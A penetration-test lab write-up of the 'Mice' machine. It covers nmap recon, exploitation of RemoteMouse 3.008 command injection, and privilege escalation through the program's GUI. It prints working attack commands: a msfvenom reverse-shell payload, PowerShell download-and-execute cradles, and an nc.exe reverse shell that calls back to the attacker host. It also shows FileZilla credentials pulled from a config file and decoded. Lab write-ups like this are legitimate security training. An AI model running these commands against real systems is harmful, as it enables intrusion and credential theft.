# Report - Mice
- Author: Henry Post
- Target: MICE
- Target IP: 192.168.62.199
- Date: 04/13/2026
# Executive Summary

This machine, Mice, was enumerated by `nmap` to have only port 3389 open.

The machine was running a service called "RemoteMouse" that was vulnerable to command injection. This was used to get a non-SYSTEM shell.

After that, the GUI of RemoteMouse was used, as it runs as SYSTEM, to get a SYSTEM level shell.
# Recommendations

- Do not use RemoteMouse at all.
	- Use a safer remote desktop protocol tool like RustDesk or AnyDesk.
- Do not store credentials in plaintext.
# Resources
- https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
- https://www.exploit-db.com/exploits/50047
# Recon

We edit `/etc/hosts` and run `nmap -sV -sC -T4 -oA initial mice`.

```
???(kali?kali)-[~]
??$ nmap -sV -sC -T4 -oA initial mice
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 18:38 +0000
Nmap scan report for mice (192.168.62.199)
Host is up (0.00083s latency).
rDNS record for 192.168.62.199: MICE
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Remote-PC
| Not valid before: 2025-12-02T17:03:21
|_Not valid after:  2026-06-03T17:03:21
| rdp-ntlm-info: 
|   Target_Name: REMOTE-PC
|   NetBIOS_Domain_Name: REMOTE-PC
|   NetBIOS_Computer_Name: REMOTE-PC
|   DNS_Domain_Name: Remote-PC
|   DNS_Computer_Name: Remote-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-04-13T18:38:45+00:00
|_ssl-date: 2026-04-13T18:38:50+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.34 seconds
```
# Non-SYSTEM access

The lab intro mentions `RemoteMouse 3.008`, so we search exploit-db for it.

https://github.com/p0dalirius/RemoteMouse-3.008-Exploit

We find a public exploit on GitHub.

```sh
git clone https://github.com/p0dalirius/RemoteMouse-3.008-Exploit
cd RemoteMouse-3.008-Exploit

python RemoteMouse-3.008-Exploit.py
# usage: RemoteMouse-3.008-Exploit.py [-h] -t TARGET_IP [-v] [-d DELAY] -c CMD
# RemoteMouse-3.008-Exploit.py: error: the following arguments are required: -t/--target-ip, -c/--cmd

# get our attacker IP
ip a | grep 192 #192.168.49.62

# generate a payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.62 LPORT=4444 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1

# host our malicious file, 'shell.ps1'
python3 -m http.server 8080

# start a listener...
sudo apt install rlwrap
rlwrap nc -lvnp 4444

# have victim download and execute reverse shell
python RemoteMouse-3.008-Exploit.py -t 192.168.62.199 -c 'powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString("http://192.168.49.62:8080/shell.ps1")"'

```

This fails, so let's try `nc.exe` binary instead.

```bash
cp /usr/share/windows-resources/binaries/nc.exe ./

python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'powershell -c "curl http://192.168.49.62/nc.exe -o C:/Windows/Temp/nc.exe"'
```

We got the victim to download `nc.exe`. We kill the python web server to re-use port 80.

![](Pasted%20image%2020260413135243.png)

```sh
# start a listener on port 80...slip through firewall
sudo apt install rlwrap
rlwrap nc -lvnp 80

python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'powershell -c "C:/Windows/Temp/nc.exe 192.168.49.62 80 -e cmd"'
```

And we get reverse shell.

![](Pasted%20image%2020260413135429.png)

# SYSTEM access

Now to search for FileZilla credentials.

%APPDATA%\FileZilla

```xml
C:\Users\divine\AppData\Roaming\FileZilla>type recentservers.xml
type recentservers.xml

<?xml version="1.0" encoding="UTF-8"?>
<FileZilla3 version="3.54.1" platform="windows">
        <RecentServers>
                <Server>
                        <Host>ftp.pg</Host>
                        <Port>21</Port>
                        <Protocol>0</Protocol>
                        <Type>0</Type>
                        <User>divine</User>
                        <Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
                        <Logontype>1</Logontype>
                        <PasvMode>MODE_DEFAULT</PasvMode>
                        <EncodingType>Auto</EncodingType>
                        <BypassProxy>0</BypassProxy>
                </Server>
        </RecentServers>
</FileZilla3>

```

Great.

`divine:ControlFreak11`

Now we need to use xfreerdp, I think.

```sh
xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'divine' /p:'ControlFreak11' /v:'MICE'
```

It fails. Let's try Remmina.

Remmina works.

![](Pasted%20image%2020260413140504.png)

Now, how do we escalate?

https://www.exploit-db.com/exploits/50047

Okay! This seems simple.

```txt
# Exploit Title: Remote Mouse GUI 3.008 - Local Privilege Escalation
# Exploit Author: Salman Asad (@deathflash1411) a.k.a LeoBreaker
# Date: 17.06.2021
# Version: Remote Mouse 3.008
# Tested on: Windows 10 Pro Version 21H1
# Reference: https://deathflash1411.github.io/blog/cve-2021-35448
# CVE: CVE-2021-35448

Steps to reproduce:

1. Open Remote Mouse from the system tray
2. Go to "Settings"
3. Click "Change..." in "Image Transfer Folder" section
4. "Save As" prompt will appear
5. Enter "C:\Windows\System32\cmd.exe" in the address bar
6. A new command prompt is spawned with Administrator privileges
```

It doesn't seem to work.

Idea: Just run `cmd.exe` on the victim.

```sh
python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'cmd.exe'
```

Or, we could try to make `divine` an admin.

```sh
python ./RemoteMouse-3.008-Exploit.py --target-ip 192.168.62.199 -v --cmd 'net localgroup administrators divine /add'
```

This seems to fail too.

I think I need to launch `cmd.exe` from within the RemoteMouse GUI, I think that https://www.exploit-db.com/exploits/50047 was actually the right path.

It was! We got root access.

![](Pasted%20image%2020260413141726.png)